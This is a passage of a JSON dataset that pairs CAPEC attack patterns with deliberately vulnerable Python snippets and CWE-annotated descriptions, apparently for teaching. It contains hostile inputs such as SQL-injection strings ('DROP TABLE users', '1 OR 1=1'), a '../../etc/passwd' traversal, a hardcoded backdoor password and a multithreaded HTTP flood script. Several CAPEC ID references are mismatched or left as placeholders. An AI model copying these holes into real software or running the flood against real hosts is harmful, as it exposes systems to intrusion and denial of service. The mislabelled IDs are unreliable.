        "code_snippet": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <head>\n        <title>Clickjacking Example</title>\n    </head>\n    <body>\n        <h1>Welcome to the vulnerable site</h1>\n        <p>Click the button below:</p>\n        <button onclick=\"window.location.href='/action'\">Click me</button>\n    </body>\n    </html>\n    ''')\n\n@app.route('/action')\ndef action():\n    return \"Action performed!\"\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that is vulnerable to clickjacking. The main page contains a button that, when clicked, redirects the user to the '/action' endpoint. However, the application does not implement any frame-busting techniques, making it susceptible to clickjacking attacks. An attacker could embed this page in an iframe on a malicious site, tricking users into clicking the button and unknowingly performing actions on the vulnerable site. This example embodies the CAPEC concept of clickjacking and highlights CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import webbrowser\n\n# Vulnerable function that opens a URL in the web browser\n# This function does not validate the input URL properly\n# and runs with unnecessary privileges\n\ndef open_url(url):\n    # Improper Input Validation (CWE-20)\n    if not url.startswith('http://') and not url.startswith('https://'):\n        raise ValueError('Invalid URL')\n\n    # Execution with Unnecessary Privileges (CWE-250)\n    # This function runs with higher privileges than necessary\n    webbrowser.open(url)\n\n# Example of a malicious URL that could exploit the vulnerability\nmalicious_url = 'javascript:alert(\"Cross Zone Scripting Attack!\")'\n\n# Improper Authorization (CWE-285)\n# The function does not check if the URL is authorized to be opened\nopen_url(malicious_url)",
        "description": "This Python code snippet demonstrates a vulnerable function `open_url` that opens a URL in the web browser. The function suffers from several security weaknesses: \n1. **Improper Input Validation (CWE-20)**: The function only checks if the URL starts with 'http://' or 'https://', but this is insufficient to prevent malicious URLs such as 'javascript:' schemes.\n2. **Execution with Unnecessary Privileges (CWE-250)**: The function runs with higher privileges than necessary, which can be exploited by an attacker.\n3. **Improper Authorization (CWE-285)**: The function does not check if the URL is authorized to be opened, allowing potentially harmful URLs to be executed.\n\nThe code represents the main idea of Cross Zone Scripting (CAPEC-160), where an attacker can cause a victim to load content that bypasses security zone controls, leading to privilege escalation and execution of malicious scripts."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass VulnerableHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        # Extracting user input from query parameters\n        user_input = self.path.split('?')[1] if '?' in self.path else ''\n        # Improper neutralization of CRLF sequences\n        response_header = f\"Set-Cookie: sessionId={user_input}\\r\\n\"\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.send_header('Set-Cookie', response_header)\n        self.end_headers()\n        self.wfile.write(b\"<html><body><h1>HTTP Request Splitting Example</h1></body></html>\")\n\nif __name__ == '__main__':\n    server = HTTPServer(('localhost', 8080), VulnerableHTTPRequestHandler)\n    print('Starting server at http://localhost:8080')\n    server.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP server that is susceptible to HTTP Request Splitting attacks. The server extracts user input from the query parameters of a GET request and directly includes it in the 'Set-Cookie' header without properly neutralizing CRLF sequences. This improper neutralization (CWE-113) allows an attacker to inject CRLF characters, potentially splitting the HTTP request into multiple unauthorized requests. The code highlights the risk of improper handling of special elements (CWE-74, CWE-138) and inconsistent interpretation of HTTP requests (CWE-444), which can lead to security vulnerabilities in intermediary HTTP agents."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import logging\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n# Configure logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # Log user input\n    logging.info(f'User input: {user_input}')\n    # Render user input in a web page without proper neutralization\n    return render_template_string(f'<p>{user_input}</p>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) through log files. The application logs user input to a file and then renders that input in a web page without proper neutralization. This embodies the deprecated CAPEC 'XSS through Log Files' by showing how user input can be logged and then improperly neutralized when displayed, leading to potential XSS attacks. The related CWEs highlight the issues of incomplete denylist-based protection (CWE-692), improper neutralization of input (CWE-79), and improper handling of script in HTML attributes (CWE-82)."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/trace', methods=['TRACE'])\ndef trace_method():\n    # CWE-693: Protection Mechanism Failure\n    # CWE-648: Incorrect Use of Privileged APIs\n    # CWE-79: Improper Neutralization of Input During Web Page Generation\n    # CWE-352: Cross-Site Request Forgery (CSRF)\n    # CWE-692: Incomplete Denylist to Cross-Site Scripting\n    response = make_response(request.data)\n    response.headers['Content-Type'] = 'message/http'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that includes a route for handling HTTP TRACE requests. The TRACE method is used to echo back the received request, which can expose sensitive information such as cookies and authentication headers. This is a demonstration of Cross Site Tracing (XST), where an attacker can exploit this functionality to steal session cookies and other credentials. The code also highlights several related weaknesses: CWE-693 (Protection Mechanism Failure) as it does not implement proper security mechanisms, CWE-648 (Incorrect Use of Privileged APIs) by allowing TRACE method without restrictions, CWE-79 (Improper Neutralization of Input) by potentially reflecting malicious input, CWE-352 (CSRF) by not verifying the origin of the request, and CWE-692 (Incomplete Denylist to XSS) by not properly handling XSS attacks."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import sqlite3\nimport os\n\n# Simulate user input\nuser_input = \"'; DROP TABLE users; --\"\n\n# Vulnerable SQL query\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\nquery = f\"SELECT * FROM users WHERE username = '{user_input}'\"\ncursor.execute(query)\n\n# Fetch potentially malicious data from the database\nresult = cursor.fetchone()\n\n# Vulnerable command execution\nif result:\n    os.system(result[0])\n\nconn.close()",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can inject SQL commands that are executed on the command line. The code first simulates user input that includes a malicious SQL injection payload. It then constructs and executes a vulnerable SQL query without proper input validation or neutralization of special elements. The result of this query, which could contain malicious data, is fetched from the database and used directly as an argument in an OS command execution via `os.system()`. This represents the CAPEC scenario where SQL injection is used to inject data that is later executed as a command, highlighting the related CWEs such as SQL Injection (CWE-89), OS Command Injection (CWE-78), and Improper Input Validation (CWE-20)."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\n\n# Database connection setup\nengine = create_engine('sqlite:///example.db')\nSession = sessionmaker(bind=engine)\nsession = Session()\n\n# User input\nuser_input = \"1 OR 1=1\"\n\n# Vulnerable query using raw SQL\nquery = f\"SELECT * FROM users WHERE id = {user_input}\"\nresult = session.execute(query)\n\n# Process result\nfor row in result:\n    print(row)",
        "description": "This Python code snippet demonstrates a vulnerable ORM-based database access pattern using SQLAlchemy, an ORM tool. The code sets up a database connection and a session, then constructs a raw SQL query using user input without proper validation or neutralization of special elements. The user input is directly interpolated into the SQL query, making it susceptible to SQL injection attacks. In this example, an attacker could manipulate the 'user_input' variable to execute arbitrary SQL commands, such as '1 OR 1=1', which would return all rows from the 'users' table. This snippet embodies the main idea of CAPEC-20 (Object Relational Mapping Injection) and highlights related weaknesses such as CWE-89 (SQL Injection) and CWE-564 (SQL Injection: Hibernate)."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport sqlite3\n\n# Sample SOAP message with user input\nsoap_message = '''\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap:Body>\n    <GetUserInfo>\n      <UserID>1 OR 1=1</UserID>\n    </GetUserInfo>\n  </soap:Body>\n</soap:Envelope>\n'''\n\n# Parse the SOAP message\nroot = ET.fromstring(soap_message)\nuser_id = root.find('.//UserID').text\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Vulnerable SQL query construction\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\n# Execute the query\ntry:\n    cursor.execute(query)\n    results = cursor.fetchall()\n    for row in results:\n        print(row)\nexcept sqlite3.Error as e:\n    print(f\"An error occurred: {e}\")\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The SOAP message contains a user input field 'UserID' which is extracted and directly used to construct an SQL query without proper validation or parameter binding. This allows an attacker to inject malicious SQL code, such as '1 OR 1=1', which can manipulate the query to return all rows from the 'users' table. The code also includes error handling that could potentially expose sensitive information if an error occurs. This example embodies the main idea of CAPEC-### and related CWEs, highlighting the risks of improper input validation and SQL injection."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n@app.route('/data', methods=['GET'])\ndef get_data():\n    # Simulated sensitive data\n    data = {'user': 'admin', 'password': 'secret'}\n    callback = request.args.get('callback')\n    if callback:\n        # Vulnerable to JSON Hijacking\n        response = f'{callback}({json.dumps(data)})'\n        return app.response_class(response, mimetype='application/javascript')\n    return jsonify(data)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to JSON Hijacking. The '/data' endpoint returns sensitive data in JSON format. If a 'callback' parameter is provided in the request, the server wraps the JSON data in a JavaScript function call, making it vulnerable to JSON Hijacking. This allows an attacker to steal the JSON data by including the endpoint in a script tag on a malicious website. The code also highlights related weaknesses such as insufficient verification of data authenticity (CWE-345), origin validation error (CWE-346), and client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import random\nimport string\n\n# Weak password generation (CWE-521)\ndef generate_weak_password():\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(6))\n\n# Simulate a login function with weak authentication (CWE-1390)\nusers = {'user1': generate_weak_password()}\n\n# Brute force attack simulation\nattempts = 0\nmax_attempts = 1000  # No restriction on excessive attempts (CWE-307)\n\nwhile attempts < max_attempts:\n    for user, password in users.items():\n        guess = generate_weak_password()\n        if guess == password:\n            print(f\"Brute force successful! User: {user}, Password: {password}\")\n            break\n    attempts += 1\nelse:\n    print(\"Brute force attack failed.\")",
        "description": "This Python code snippet demonstrates a brute force attack on a system with weak security measures. The `generate_weak_password` function creates a weak password using only lowercase letters and a length of 6 characters, illustrating CWE-521 (Weak Password Requirements). The `users` dictionary stores a user with a weak password. The brute force attack is simulated by repeatedly generating weak passwords and checking them against the stored password without any restriction on the number of attempts (CWE-307, Improper Restriction of Excessive Authentication Attempts). The code highlights the vulnerability of systems with weak password policies and insufficient protection against brute force attacks."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate memory-mapped I/O register access\nclass MemoryMappedIO:\n    def __init__(self, address):\n        self.address = address\n        self.value = 0\n\n    def read(self):\n        return self.value\n\n    def write(self, value):\n        self.value = value\n\n# Simulate improper access control to a register\nclass Device:\n    def __init__(self):\n        self.register = MemoryMappedIO(0x1000)\n\n    def perform_operation(self, user_input):\n        # Improper access control: allowing user input to directly modify the register\n        self.register.write(user_input)\n        return self.register.read()\n\n# Simulate an attacker manipulating the interface\nif __name__ == '__main__':\n    device = Device()\n    # Attacker provides input to manipulate the register\n    attacker_input = 0xDEADBEEF\n    result = device.perform_operation(attacker_input)\n    print(f'Register value after attack: {hex(result)}')",
        "description": "This Python code snippet simulates a scenario where an attacker can manipulate a memory-mapped I/O register due to improper access control. The `MemoryMappedIO` class represents a memory-mapped I/O register, and the `Device` class simulates a device with such a register. The `perform_operation` method in the `Device` class improperly allows user input to directly modify the register value, representing CWE-1262 (Improper Access Control for Register Interface). The main function demonstrates how an attacker can exploit this vulnerability by providing malicious input to manipulate the register, embodying the main idea of CAPEC-Interface Manipulation."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import hashlib\n\n# Weak authentication mechanism\nusers = {\n    'admin': '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    hashed_password = hashlib.md5(password.encode()).hexdigest()\n    if username in users and users[username] == hashed_password:\n        return True\n    return False\n\n# Simulating an authentication bypass\n# An attacker can exploit the weak hash function (MD5) and lack of rate limiting\nfor attempt in range(1000000):\n    if authenticate('admin', 'password'):\n        print('Access granted')\n        break\n    else:\n        print('Access denied')",
        "description": "This Python code snippet demonstrates a weak authentication mechanism vulnerable to brute force attacks and improper authentication. The `authenticate` function uses MD5 hashing, which is considered weak and easily crackable. The code lacks rate limiting, allowing an attacker to make multiple authentication attempts in a short time frame. This embodies the CAPEC 'Authentication Abuse' by showing how an attacker can exploit weak authentication (CWE-1390) and the lack of restriction on excessive authentication attempts (CWE-307) to gain unauthorized access."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'admin': '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if users[username] == hashed_password:\n            return True\n    return False\n\n# Bypass authentication by using a hardcoded backdoor\ndef authenticate_with_backdoor(username, password):\n    if username == 'admin' and password == 'backdoor':\n        return True\n    return authenticate(username, password)\n\n# Example usage\nusername = 'admin'\npassword = 'backdoor'\n\nif authenticate_with_backdoor(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates an authentication bypass vulnerability. The `authenticate` function checks if the provided username and password match the stored credentials using MD5 hashing. However, the `authenticate_with_backdoor` function introduces a hardcoded backdoor password ('backdoor') for the 'admin' user, allowing an attacker to bypass the authentication mechanism. This represents CWE-288 (Authentication Bypass Using an Alternate Path or Channel) and CWE-305 (Authentication Bypass by Primary Weakness), as the backdoor provides an alternate, insecure path to gain access."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\n\n# Simulate an untrusted search path vulnerability\nsearch_path = os.getenv('UNTRUSTED_PATH', '/default/path')\n\n# Function to read sensitive information\ndef read_sensitive_info(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Simulate exposure of sensitive information\nsensitive_info = read_sensitive_info(f'{search_path}/sensitive_info.txt')\nprint(f'Sensitive Information: {sensitive_info}')\n\n# Simulate debug mode exposing sensitive information\nDEBUG_MODE = True\nif DEBUG_MODE:\n    debug_info = read_sensitive_info('/fuses/debug_info.txt')\n    print(f'Debug Information: {debug_info}')",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit vulnerabilities to extract sensitive information. The code uses an untrusted search path (CWE-426) to locate and read a sensitive file, potentially exposing sensitive information to unauthorized actors (CWE-200). Additionally, it simulates a debug mode that exposes security-sensitive information stored in fuses (CWE-1243). This represents the CAPEC concept of 'Excavation,' where an adversary actively probes the target to solicit information for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\n\n# Vulnerable code: Transmitting sensitive information in cleartext\nserver_address = ('localhost', 10000)\n\n# Create a TCP/IP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect the socket to the port where the server is listening\nsock.connect(server_address)\n\ntry:\n    # Send sensitive data in cleartext\n    message = 'username=admin&password=secret'\n    sock.sendall(message.encode('utf-8'))\n\n    # Look for the response\n    amount_received = 0\n    amount_expected = len(message)\n\n    while amount_received < amount_expected:\n        data = sock.recv(16)\n        amount_received += len(data)\n        print('Received:', data.decode('utf-8'))\n\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation where sensitive information (username and password) is transmitted in cleartext over a network. The code creates a TCP/IP socket, connects to a server, and sends a message containing sensitive data without any encryption. This makes it susceptible to interception attacks (CAPEC-94) where an adversary can sniff the network traffic and capture the sensitive information. The code embodies CWE-319 (Cleartext Transmission of Sensitive Information) as it fails to encrypt the data being transmitted, making it easy for unauthorized actors to intercept and read the data."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import urllib.parse\n\ndef is_safe_input(user_input):\n    # Incomplete list of disallowed inputs (CWE-184)\n    disallowed_inputs = ['..', '%2E', '%252E']\n    # Improper handling of URL encoding (CWE-177)\n    decoded_input = urllib.parse.unquote(user_input)\n    if any(bad in decoded_input for bad in disallowed_inputs):\n        return False\n    return True\n\n# Example usage\nuser_input = '%252E%252E%252Fetc%252Fpasswd'  # Double encoded path traversal attempt\nif is_safe_input(user_input):\n    print(\"Input is safe\")\nelse:\n    print(\"Input is not safe\")",
        "description": "This Python code snippet demonstrates a vulnerability related to double encoding (CAPEC-170). The function `is_safe_input` attempts to check if the user input contains disallowed patterns, such as those used in path traversal attacks. However, it only decodes the input once, which means it may fail to detect doubly encoded malicious inputs. The list of disallowed inputs is also incomplete (CWE-184), and the code does not properly handle URL encoding (CWE-177). This can allow an attacker to bypass the filter by using double encoding, as shown in the example usage where a double encoded path traversal attempt is not detected as unsafe."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "import os\n\nclass ProductionSystem:\n    def __init__(self):\n        self.debug_mode = os.getenv('DEBUG_MODE', 'False') == 'True'\n        self.security_token = self.generate_security_token()\n\n    def generate_security_token(self):\n        if self.debug_mode:\n            # Insecure token generation for debugging purposes\n            return 'DEBUG-TOKEN-1234'\n        else:\n            # Proper token generation for production\n            return 'PROD-TOKEN-5678'\n\n    def sensitive_operation(self):\n        if self.debug_mode:\n            print('Debug: Performing sensitive operation')\n        # Perform the sensitive operation\n        return 'Sensitive data'\n\n# Simulate a production environment with debug mode enabled\nos.environ['DEBUG_MODE'] = 'True'\n\nsystem = ProductionSystem()\nprint(system.sensitive_operation())\nprint(f'Security Token: {system.security_token}')",
        "description": "This Python code snippet represents a production system that has a debug mode which can be enabled via an environment variable. When the debug mode is enabled, the system generates an insecure security token and prints debug messages that reveal sensitive information. This embodies the main idea of CAPEC-0022 (Exploit Non-Production Interfaces) by demonstrating how an adversary could exploit a debug interface unintentionally left enabled in a production environment. The related CWEs are represented by the insecure token generation (CWE-1270), revealing unnecessary information in debug messages (CWE-1295), and the active debug code (CWE-489)."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class User:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\nclass Resource:\n    def __init__(self, name, sensitive_data):\n        self.name = name\n        self.sensitive_data = sensitive_data\n\n    def access_resource(self, user):\n        if user.role == 'admin':\n            return self.sensitive_data\n        else:\n            return 'Access Denied'\n\n# Example usage\nadmin_user = User('admin_user', 'admin')\nregular_user = User('regular_user', 'user')\n\nsensitive_resource = Resource('SensitiveResource', 'Top Secret Data')\n\n# Admin user accessing the resource\nprint(sensitive_resource.access_resource(admin_user))  # Expected: 'Top Secret Data'\n\n# Regular user accessing the resource\nprint(sensitive_resource.access_resource(regular_user))  # Expected: 'Access Denied'\n\n# Vulnerability: Improper privilege management\n# Regular user is given admin role\nregular_user.role = 'admin'\nprint(sensitive_resource.access_resource(regular_user))  # Expected: 'Top Secret Data', but should be 'Access Denied'",
        "description": "This Python code snippet demonstrates a simple user-role based access control system. The `User` class represents a user with a username and role, while the `Resource` class represents a resource containing sensitive data. The `access_resource` method checks if the user has an 'admin' role before granting access to the sensitive data. The code highlights a vulnerability where a regular user can change their role to 'admin' and gain unauthorized access to sensitive data, embodying the main idea of CAPEC-233 (Privilege Abuse) and related CWEs such as CWE-269 (Improper Privilege Management) and CWE-284 (Improper Access Control)."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def vulnerable_function(input_data):\n    buffer = [0] * 10  # Fixed-size buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No bounds checking\n    return buffer\n\n# Example usage\ninput_data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]  # Input larger than buffer\nresult = vulnerable_function(input_data)\nprint(result)",
        "description": "This Python code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerable_function` takes `input_data` and attempts to copy its contents into a fixed-size buffer of 10 elements. However, there is no bounds checking to ensure that the input data fits within the buffer. If `input_data` is larger than the buffer, this will result in writing past the end of the buffer, potentially overwriting other memory locations. This embodies the main idea of the CAPEC, where the buffer space itself is the target of the attack, and the content placed in the buffer is immaterial. The code also touches on CWE-1285, as it does not validate the index or position when accessing the buffer."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import threading\n\n# Shared resource\nshared_resource = 0\n\n# Lock for synchronizing access to the shared resource\nlock = threading.Lock()\n\n# Function to be run by multiple threads\ndef manipulate_shared_resource():\n    global shared_resource\n    for _ in range(1000):\n        # Improper synchronization: lock is not used\n        temp = shared_resource\n        temp += 1\n        shared_resource = temp\n\n# Create multiple threads\nthreads = [threading.Thread(target=manipulate_shared_resource) for _ in range(10)]\n\n# Start all threads\nfor thread in threads:\n    thread.start()\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()\n\nprint(f\"Final value of shared_resource: {shared_resource}\")",
        "description": "This Python code snippet demonstrates a shared resource manipulation vulnerability. The shared resource 'shared_resource' is accessed and modified by multiple threads without proper synchronization, leading to potential race conditions. This embodies the main idea of CAPEC-662 (Improper Synchronization) where multiple threads access a shared resource without proper locking mechanisms, causing data corruption or unexpected behavior. The code creates multiple threads that increment a shared variable without using a lock, which can result in an incorrect final value due to race conditions."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import threading\nimport requests\n\n# URL to target\nurl = 'http://example.com'\n\n# Function to perform a large number of requests\ndef flood_target():\n    while True:\n        try:\n            response = requests.get(url)\n            print(f'Response Code: {response.status_code}')\n        except requests.exceptions.RequestException as e:\n            print(f'Request failed: {e}')\n\n# Create multiple threads to simulate a flood attack\nthreads = []\nfor i in range(100):  # Adjust the number of threads as needed\n    thread = threading.Thread(target=flood_target)\n    threads.append(thread)\n    thread.start()\n\n# Join threads to ensure they run indefinitely\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a simple flooding attack by creating multiple threads that continuously send HTTP GET requests to a target URL. The code does not implement any rate limiting or resource throttling, which aligns with CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption). The lack of proper resource management can lead to the exhaustion of the target's resources, making it unavailable to legitimate users, which is the main idea of the CAPEC 'Flooding' attack."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/data/'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The function `read_file` takes a `file_path` as input and constructs a full path by joining it with a base directory (`/var/www/data/`). However, it does not properly validate or sanitize the `file_path` input, allowing an attacker to use sequences like `../../` to traverse directories and access files outside the intended directory. In the example usage, the user input `../../etc/passwd` attempts to read the system's password file, which should be restricted. This code embodies the main idea of the CAPEC by showing how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\n\n@app.route('/files/<path:filename>', methods=['GET'])\ndef download_file(filename):\n    # CWE-276: Incorrect Default Permissions\n    # CWE-732: Incorrect Permission Assignment for Critical Resource\n    directory = '/var/www/files'\n    try:\n        # CWE-425: Direct Request ('Forced Browsing')\n        # CWE-424: Improper Protection of Alternate Path\n        return send_from_directory(directory, filename)\n    except Exception as e:\n        return str(e), 404\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that serves files from a directory. The route '/files/<path:filename>' allows users to request files directly by specifying the filename in the URL. The code does not implement any authorization checks, which means any user can access any file in the specified directory. This embodies the main idea of CAPEC-126 (Directory Indexing) by allowing an adversary to explore the directory tree and access files without proper authorization. The code also demonstrates related CWEs such as CWE-276 (Incorrect Default Permissions) and CWE-732 (Incorrect Permission Assignment for Critical Resource) by not restricting access to critical files and directories."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "def vulnerable_function(user_input):\n    MAX_INT = 2147483647  # Maximum value for a 32-bit signed integer\n    MIN_INT = -2147483648  # Minimum value for a 32-bit signed integer\n\n    # CWE-682: Incorrect Calculation\n    result = user_input + 1\n\n    # CWE-839: Numeric Range Comparison Without Minimum Check\n    if result <= MAX_INT:\n        print(\"Result is within the allowed range.\")\n    else:\n        print(\"Result exceeds the maximum allowed range.\")\n\n    # CWE-190: Integer Overflow or Wraparound\n    if user_input == MAX_INT:\n        print(\"Integer overflow occurred!\")\n\n    # CWE-194: Unexpected Sign Extension\n    extended_result = (result & 0xFFFFFFFF)  # Simulate sign extension\n    if extended_result < 0:\n        print(\"Unexpected sign extension occurred!\")\n\n    # CWE-192: Integer Coercion Error\n    coerced_result = int(result)  # Simulate coercion\n    print(f\"Coerced result: {coerced_result}\")\n\n# Example usage\nvulnerable_function(2147483647)",
        "description": "This Python code snippet demonstrates several integer-related vulnerabilities as described in the CAPEC and related CWEs. The function `vulnerable_function` takes a user input and performs various operations that can lead to security issues:\n\n1. **CWE-682: Incorrect Calculation** - The code adds 1 to the user input, which can lead to incorrect results if the input is at the boundary of the integer range.\n2. **CWE-839: Numeric Range Comparison Without Minimum Check** - The code checks if the result is less than or equal to the maximum integer value but does not check if it is greater than or equal to the minimum integer value.\n3. **CWE-190: Integer Overflow or Wraparound** - The code checks for integer overflow by comparing the user input to the maximum integer value.\n4. **CWE-194: Unexpected Sign Extension** - The code simulates sign extension by masking the result, which can lead to unexpected negative values.\n5. **CWE-192: Integer Coercion Error** - The code coerces the result to an integer, which can lead to truncation or other coercion-related issues.\n\nThe example usage demonstrates how the function can be called with a value that causes these vulnerabilities to manifest."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate untrusted input\nuntrusted_input = -1\n\n# Convert untrusted input to a pointer\nptr = ctypes.c_void_p(untrusted_input)\n\n# Dereference the pointer\ntry:\n    value = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_int)).contents.value\n    print(f'Dereferenced value: {value}')\nexcept ValueError as e:\n    print(f'Error: {e}')\nexcept Exception as e:\n    print(f'Unexpected error: {e}')",
        "description": "This Python code snippet demonstrates a pointer manipulation vulnerability by converting an untrusted input to a pointer and then attempting to dereference it. The untrusted input is set to -1, which is an invalid memory address. The code uses the ctypes library to handle the pointer conversion and dereferencing. This can lead to undefined behavior, crashes, or potential security risks if the pointer points to sensitive memory areas. The code captures and prints errors that occur during dereferencing, highlighting the risks associated with untrusted pointer dereference (CWE-822) and potential out-of-range pointer offsets (CWE-823)."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "class ResourceAllocator:\n    def __init__(self):\n        self.resources = []\n\n    def allocate(self, size):\n        # CWE-770: No limit on the size of the allocation\n        self.resources.append(' ' * size)\n\n    def release(self):\n        # CWE-404: Improper resource release\n        self.resources = []\n\nallocator = ResourceAllocator()\n\n# Simulate an excessive allocation attack\ntry:\n    allocator.allocate(10**9)  # Allocate 1 GB of memory\nexcept MemoryError:\n    print('Memory allocation failed')\n\n# Release resources\nallocator.release()",
        "description": "This Python code snippet demonstrates an excessive allocation attack by allocating a large amount of memory (1 GB) in a single request. The `ResourceAllocator` class has an `allocate` method that appends a large string to the `resources` list without any size limit (CWE-770). The `release` method improperly releases resources by simply clearing the list (CWE-404). This code represents the main idea of the CAPEC by showing how an attacker can cause excessive resource allocation with a single request, potentially leading to resource exhaustion and denial of service."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import threading\n\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.resource = []\n\n    def add_data(self, data):\n        self.lock.acquire()\n        try:\n            self.resource.append(data)\n        finally:\n            # Improper release of resource\n            pass\n\n    def get_data(self):\n        self.lock.acquire()\n        try:\n            if self.resource:\n                return self.resource.pop(0)\n            else:\n                return None\n        finally:\n            self.lock.release()\n\nresource = Resource()\n\n# Simulate adding data\nfor i in range(10):\n    resource.add_data(i)\n\n# Simulate getting data\nfor i in range(10):\n    print(resource.get_data())",
